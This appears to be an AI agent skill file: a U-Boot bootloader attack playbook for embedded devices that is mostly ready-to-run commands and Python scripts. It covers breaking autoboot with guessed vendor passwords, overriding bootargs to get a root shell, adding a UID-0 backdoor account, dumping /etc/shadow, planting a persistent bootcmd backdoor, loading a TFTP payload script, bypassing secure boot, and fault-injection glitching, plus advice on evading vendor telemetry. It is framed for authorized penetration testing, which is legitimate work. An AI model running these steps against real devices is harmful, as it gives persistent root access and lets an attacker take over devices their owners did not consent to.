---
name: bootloader-uboot
description: U-Boot bootloader attack playbook — console interrupt to break the autoboot countdown, environment variable inspection and manipulation, bootargs override to spawn init=/bin/sh, secure-boot bypass techniques, and fault-injection basics (voltage and clock glitching). Covers MIPS, ARM, and AArch64 targets.
allowed-tools: Bash Read Write
metadata:
  subdomain: iot
  when_to_use: U-Boot, uboot, bootloader, autoboot, printenv, setenv, bootargs, init=/bin/sh, secure boot bypass, fault injection, glitching, boot console, UART bootloader, embedded Linux boot
  tags: iot, uboot, bootloader, uart, console, secure-boot, fault-injection, glitching, embedded, linux-boot
  mitre_attack: T1542.005, T1542.003, T1601.001
---

# U-Boot Bootloader Attack

> U-Boot is the dominant open-source bootloader for embedded Linux devices.
> A UART console with an unpatched autoboot allows complete OS compromise
> without touching the running filesystem: override `bootargs`, pass
> `init=/bin/sh`, and land a root shell before `init` starts.

## Prerequisites

- UART console connected (see `firmware-acquisition` skill, Tier 1).
- Serial terminal: `screen /dev/ttyUSB0 115200` or `picocom -b 115200 /dev/ttyUSB0`.
- Physical access to power-cycle the device.
- Tools (optional, for scripted attacks): `minicom`, `expect`, `python3-serial`.

---

## Phase 1 — Console Interrupt

### 1a. Manual interrupt

```
1. Open serial terminal BEFORE powering device.
2. Apply power.
3. Watch for U-Boot banner:
     U-Boot 2020.01 (Jan 01 2020)
     ...
     Hit any key to stop autoboot: 3 2 1
4. Press any key (spacebar reliable) during countdown to get '=>' prompt.
```

If autoboot completes before interrupt: power-cycle and try again. Some
devices accept keys up to 500ms before the countdown appears.

### 1b. When autoboot_delay is 0 or password-protected

```bash
# Approach A: Interrupt via UART break signal (before U-Boot banner)
python3 -c "
import serial, time
s = serial.Serial('/dev/ttyUSB0', 115200)
s.send_break(duration=0.5)
time.sleep(0.1)
s.write(b'\r\n')
print(s.read(200))"

# Approach B: Hardware glitch to reset autoboot timer (see Phase 5)

# Approach C: Some vendors compile with CONFIG_AUTOBOOT_KEYED_CTRLC=y
#   Try: Ctrl+C, then 'adc', then model-specific passwords
#   Common: 'aDm1n+' '3008' 'anko' 'GM8182' 'realtekk' 'password'
```

---

## Phase 2 — Environment Inspection

```bash
# At U-Boot => prompt:

# Print ALL environment variables
printenv

# Key variables to examine:
# bootargs    = kernel command line (target for init override)
# bootcmd     = boot command sequence (target for persistence)
# ipaddr      = device IP (useful for TFTP)
# serverip    = TFTP server IP
# netmask     = subnet mask
# mtdparts    = flash partition map (offsets for SPI dump / write)
# fdtcontroladdr = FDT address (check secure-boot flags here)
```

### 2a. Flash partition map extraction

```
=> mtdparts
=> flinfo           # (older U-Boot) detailed partition info
=> cat /proc/mtd    # (from Linux, if booting fails) — compare with mtdparts
```

Expected output example:
```
mtdparts=spi0.0:256k(u-boot),64k(u-boot-env),64k(factory),2048k(kernel),5888k(rootfs),-(storage)
```

---

## Phase 3 — bootargs Override → init=/bin/sh

This is the primary exploitation primitive: replace the kernel init process
with a root shell before any authentication or privilege separation occurs.

```bash
# Inspect current bootargs
=> printenv bootargs
# Example: root=/dev/mtdblock3 rootfstype=squashfs console=ttyS0,115200 noinitrd

# Override: append init=/bin/sh (or replace init entirely)
=> setenv bootargs "root=/dev/mtdblock3 rootfstype=squashfs console=ttyS0,115200 noinitrd init=/bin/sh"

# Boot with modified args (trigger the original bootcmd)
=> run bootcmd

# Alternative: load kernel manually and boot with setenv bootargs
=> tftpboot 0x80000000 uImage
=> setenv bootargs "root=/dev/mtdblock3 rootfstype=squashfs console=ttyS0,115200 init=/bin/sh"
=> bootm 0x80000000
```

Once the kernel drops to `/bin/sh`:
```bash
# Remount rootfs read-write
mount -o remount,rw /
# Add backdoor account
echo 'backdoor:x:0:0:root:/root:/bin/sh' >> /etc/passwd
# Set password
passwd backdoor    # or directly edit shadow
# Or extract /etc/shadow for offline crack
cat /etc/shadow
```

### 3a. Single-user mode (alternative)

```bash
# Append 'single' or 'S' to bootargs for systemd/SysV init single-user mode
=> setenv bootargs "${bootargs} single"
=> run bootcmd
```

---

## Phase 4 — Persistent Environment Modification

```bash
# Save modified environment to flash (survives reboot)
=> saveenv
# Warning: only do this if persistence is in RoE scope.
# Revert with:
=> setenv bootcmd "<original_value>"
=> saveenv

# Add persistent backdoor via bootcmd (executes on every boot)
=> setenv bootcmd "run addbackdoor; run origbootcmd"
=> setenv addbackdoor "run bootargs; echo 'backdoor::0:0::/:/bin/sh' >> /etc/passwd"
# NOTE: >> redirect not available in all U-Boot versions; use fatwrite / ext4write instead

# Persist via TFTP-loaded script
=> setenv serverip 192.168.1.10
=> setenv ipaddr 192.168.1.100
=> tftpboot 0x80000000 payload.scr
=> source 0x80000000
```

---

## Phase 5 — Secure Boot Bypass

### 5a. Identify secure boot configuration

```bash
# At U-Boot prompt:
=> printenv secure_boot  # vendor-specific variable name
=> bdinfo                # board info, check CPU flags
=> fuse status           # (i.MX targets) read eFuse state
=> hab_status            # i.MX HAB (High Assurance Boot) status
```

### 5b. FDT (Device Tree) manipulation

```bash
# Load FDT and inspect secure-boot flag
=> fdt addr 0x84000000
=> fdt list /
=> fdt print /chosen     # often contains kernel cmdline + secure flags
# Override secure-boot flag in FDT if not eFuse-locked:
=> fdt set /chosen secure_boot <0>
```

### 5c. Rollback attack (firmware downgrade)

```bash
# U-Boot environment may expose update URL or version check
=> printenv | grep -i "version\|rollback\|fw_"
# If firmware version check is in env, not eFuse:
=> setenv fw_version 0
=> run upgrade_check     # may allow older (unpatched) firmware load
```

### 5d. Bootloader replacement via TFTP (if no verified boot)

```bash
# Flash an unsigned / patched U-Boot (only if RoE permits flash writes)
=> tftpboot 0x80000000 u-boot.bin
=> sf probe
=> sf erase 0x0 0x40000
=> sf write 0x80000000 0x0 0x40000
# Risk: brick if image is wrong size/offset — verify mtdparts first
```

---

## Phase 6 — Fault Injection (Voltage / Clock Glitching)

Fault injection bypasses secure-boot signature checks by corrupting the
CPU instruction stream during the signature verification window.

### 6a. ChipWhisperer-Nano (voltage glitching)

```python
# ChipWhisperer Python API — target: STM32F4 or similar MCU bootloader
import chipwhisperer as cw

scope = cw.scope()
scope.default_setup()
scope.glitch.clk_src = "clkgen"
scope.glitch.output = "glitch_only"
scope.glitch.trigger_src = "ext_single"
scope.glitch.width = 24       # tune: 10-50 for most Cortex-M targets
scope.glitch.offset = 1200    # tune: trigger offset from reset release
scope.io.glitch_hp = True

target = cw.target(scope)
scope.arm()
# Power-cycle target; glitch fires at offset, corrupting signature check
ret = scope.capture()
resp = target.read(100)
print(resp)  # 'BOOT OK' or similar = bypass success
```

### 6b. Raspberry Pi clock glitcher (low-cost alternative)

```bash
# pigpio-based clock glitch on GPIO-connected CLK line
# https://github.com/nstarke/raspberry-pi-glitcher
python3 glitch.py --offset 1000 --width 50 --pin 18
```

### 6c. Manual crowbar glitch (bench power supply)

```
1. Identify VCC_CORE rail (typically 1.0–1.2 V for application processor).
2. Place 10 Ω resistor + MOSFET crowbar on VCC_CORE rail.
3. Trigger MOSFET via microcontroller at measured delay after reset release.
4. Iterate offset + duration until signature check returns True (CPU skipped
   the branch-if-fail or corrupted the RSA modulus comparison).
```

---

## Scripted Autoboot Interrupt (Python)

```python
#!/usr/bin/env python3
"""Automated U-Boot console interrupt + bootargs override."""
import serial, time, sys

PORT = "/dev/ttyUSB0"
BAUD = 115200
INIT_OVERRIDE = "init=/bin/sh"

s = serial.Serial(PORT, BAUD, timeout=2)
print("[*] Waiting for U-Boot banner...")

buffer = b""
while b"autoboot" not in buffer.lower() and b"stop autoboot" not in buffer.lower():
    chunk = s.read(256)
    buffer += chunk
    sys.stdout.buffer.write(chunk)
    sys.stdout.buffer.flush()

print("\n[*] Sending interrupt...")
for _ in range(10):
    s.write(b" ")
    time.sleep(0.05)

time.sleep(0.3)
response = s.read(256)
if b"=>" not in response:
    print("[-] No U-Boot prompt — try manual interrupt")
    sys.exit(1)

print("[+] U-Boot prompt obtained")
s.write(b"printenv bootargs\r\n"); time.sleep(0.3)
ba = s.read(512).decode(errors="replace")
print(ba)

# Extract existing bootargs line
for line in ba.splitlines():
    if line.startswith("bootargs="):
        orig = line[len("bootargs="):]
        break

new_args = orig.rstrip() + f" {INIT_OVERRIDE}"
s.write(f'setenv bootargs "{new_args}"\r\n'.encode()); time.sleep(0.3)
s.write(b"run bootcmd\r\n")
print(f"[+] Sent: setenv bootargs with {INIT_OVERRIDE}")
print("[*] Booting — watch terminal for /bin/sh prompt")
```

---

## Evidence

```bash
EVDIR=/workspace/evidence/iot/<target>/bootloader
mkdir -p "$EVDIR"
# Capture full printenv output
tee "$EVDIR/uboot_env.txt"    # pipe terminal session output
# Document the bootargs override chain
echo "bootargs override: init=/bin/sh appended; root shell obtained at $(date -u +%FT%TZ)" \
    >> "$EVDIR/notes.txt"
```

## OPSEC Notes

- `saveenv` writes to flash and is persistent — only use if persistence is
  explicitly in scope. Failing to revert leaves a modified device.
- Voltage glitching can permanently damage the target SoC. Use on expendable
  test units; not on production hardware without explicit authorization.
- HAB-enabled i.MX targets log boot failures to a one-time-programmable counter;
  excessive failed attempts may lock the device permanently.
- Some vendors monitor UART console activity via cloud telemetry — confirm
  the device is air-gapped or network-isolated before console work.

## References

- U-Boot command reference: `https://u-boot.readthedocs.io/en/latest/usage/index.html`
- ChipWhisperer-Nano: `https://rtfm.newae.com/Capture/ChipWhisperer-Nano/`
- i.MX HAB (secure boot): `https://docs.nxp.com/bundle/AN4581`
- Fault injection fundamentals: `https://tches.iacr.org/index.php/TCHES/article/view/7390`
- practical-iot-hacking (No Starch): Chapter 9 — U-Boot attacks
